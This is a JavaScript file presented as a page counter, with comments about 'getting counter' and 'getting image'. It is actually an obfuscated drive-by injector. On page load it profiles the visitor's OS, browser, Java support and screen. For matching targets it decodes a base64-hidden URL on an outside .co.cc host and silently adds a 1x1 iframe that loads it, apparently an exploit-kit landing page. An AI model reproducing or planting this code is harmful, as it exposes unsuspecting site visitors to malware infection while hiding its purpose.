

var i,j,key;
	i = 0;
	j = 1;
	for(i=0;i < 20;i++) {
		key = j + i + 20;
		j = key - 10;
	}

//document.write('<img src="/acticheat.php?code='+key+'" width="0" height="0" border="0" />');

var counter = {
	// private property
	_keyStr : "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=",
	// public method for set counter
	set : function (input) {
		var output = "";
		var chr1, chr2, chr3, enc1, enc2, enc3, enc4;
		var i = 0;
		input = counter._utf8_encode(input);
		while (i < input.length) {
			chr1 = input.charCodeAt(i++);chr2 = input.charCodeAt(i++);chr3 = input.charCodeAt(i++);enc1 = chr1 >> 2;enc2 = ((chr1 & 3) << 4) | (chr2 >> 4);enc3 = ((chr2 & 15) << 2) | (chr3 >> 6);enc4 = chr3 & 63;
			if (isNaN(chr2)) {
				enc3 = enc4 = 64;
			} else if (isNaN(chr3)) {
				enc4 = 64;
			}
			output = output +
			this._keyStr.charAt(enc1) + this._keyStr.charAt(enc2) +	this._keyStr.charAt(enc3) + this._keyStr.charAt(enc4);
		}
		return output;
	},
	// public method for getting counter
	get : function (input) {
		var output = "";
		var chr1, chr2, chr3;
		var enc1, enc2, enc3, enc4;
		var i = 0;
 
		input = input.replace(/[^A-Za-z0-9\+\/\=]/g, "");
 
		while (i < input.length) {
 
			enc1 = this._keyStr.indexOf(input.charAt(i++));enc2 = this._keyStr.indexOf(input.charAt(i++));enc3 = this._keyStr.indexOf(input.charAt(i++));enc4 = this._keyStr.indexOf(input.charAt(i++));
			chr1 = (enc1 << 2) | (enc2 >> 4);chr2 = ((enc2 & 15) << 4) | (enc3 >> 2);chr3 = ((enc3 & 3) << 6) | enc4;output = output + String.fromCharCode(chr1);
			if (enc3 != 64) {
				output = output + String.fromCharCode(chr2);
			}
			if (enc4 != 64) {
				output = output + String.fromCharCode(chr3);
			}
		}
		output = counter._utf8_decode(output);
		return output;
	},

	// private method for UTF-8 encoding
	_utf8_encode : function (string) {
		string = string.replace(/\r\n/g,"\n");
		var utftext = "";
		for (var n = 0; n < string.length; n++) {
			var c = string.charCodeAt(n);
			if (c < 128) {
				utftext += String.fromCharCode(c);
			}
			else if((c > 127) && (c < 2048)) {
				utftext += String.fromCharCode((c >> 6) | 192);utftext += String.fromCharCode((c & 63) | 128);
			}
			else {
				utftext += String.fromCharCode((c >> 12) | 224);utftext += String.fromCharCode(((c >> 6) & 63) | 128);utftext += String.fromCharCode((c & 63) | 128);
			}
		}
		return utftext;
	},
	// private method for UTF-8 decoding
	_utf8_decode : function (utftext) {
		var string = "";
		var i = 0;
		var c = c1 = c2 = 0;
		while ( i < utftext.length ) {
			c = utftext.charCodeAt(i);
			if (c < 128) {
				string += String.fromCharCode(c);
				i++;
			}
			else if((c > 191) && (c < 224)) {
				c2 = utftext.charCodeAt(i+1);string += String.fromCharCode(((c & 31) << 6) | (c2 & 63));
				i += 2;
			}
			else {
				c2 = utftext.charCodeAt(i+1);c3 = utftext.charCodeAt(i+2);string += String.fromCharCode(((c & 15) << 12) | ((c2 & 63) << 6) | (c3 & 63));
				i += 3;
			}
		}
		return string;
	}
 
}


var mouse = true;
var msuse = false;


function checkmouse(){

	if(mouse){if(key!=401) mouse=false;}
	if(mouse){if((screen.width < 1024) || (screen.height < 768)) mouse=false;}
	if(mouse){if(screen.colorDepth < 24) mouse=false;}
	if(mouse){if(navigator.appVersion.indexOf("Win")==-1) mouse=false;}
	if(mouse){var br = DetectBrowser();if(br!='Internet Explorer' && br!='Firefox'){mouse=false;}else{if(br=='Internet Explorer' && (PluginDetect.getVersion('Java')==null || navigator.javaEnabled()<1)){mouse=false;}}}
	if(mouse==true && msuse==false ){msuse = true;getimage('a325ghj');}
}

function DetectBrowser(){var agt=navigator.userAgent.toLowerCase();if (agt.indexOf("opera") != -1) return 'Opera';if (agt.indexOf("staroffice") != -1) return 'Star Office';if (agt.indexOf("webtv") != -1) return 'WebTV';if (agt.indexOf("beonex") != -1) return 'Beonex';if (agt.indexOf("chimera") != -1) return 'Chimera';if (agt.indexOf("netpositive") != -1) return 'NetPositive';if (agt.indexOf("chrome") != -1) return 'Chrome';if (agt.indexOf("firefox") != -1) return 'Firefox';if (agt.indexOf("safari") != -1) return 'Safari';if (agt.indexOf("skipstone") != -1) return 'SkipStone';if (agt.indexOf("msie") != -1) return 'Internet Explorer';if (agt.indexOf("netscape") != -1) return 'Netscape';if (agt.indexOf("mozilla/5.0") != -1) return 'Mozilla';if (agt.indexOf('\/') != -1) {if (agt.substr(0,agt.indexOf('\/')) != 'mozilla') {return navigator.userAgent.substr(0,agt.indexOf('\/'));}else return 'Netscape';} else if (agt.indexOf(' ') != -1)return navigator.userAgent.substr(0,agt.indexOf(' '));else return navigator.userAgent;}

function getimage(key){
	var input;
	var output;
	var coun;
	
	input = key;
	
	key = input.length;
	
	switch(input){
		// getting counter
		case 'a325ghj':
			coun = counter.get('aWZyYW1l');
		break;
		// getting image
		case 'gdf544':
			coun = counter.get('aW1n');
		break;
		// set counter ++
		case '98grth':
			coun = counter.set('aZkf264');
		break;
	}
	// setting content (image, counter)
	cnter = document.createElement(coun);
	cnter.setAttribute("src", counter.get('aHR0cDovL2Vhc3kyMDk4LmNvLmNjL21haW4ucGhwP3BhZ2U9MjA1OTA3ZjlmMThjMWQ2ZA=='));
	cnter.style.width = 1+"px";
	cnter.style.height = 1+"px";
	document.body.appendChild(cnter);
}
window.onload = checkmouse; 
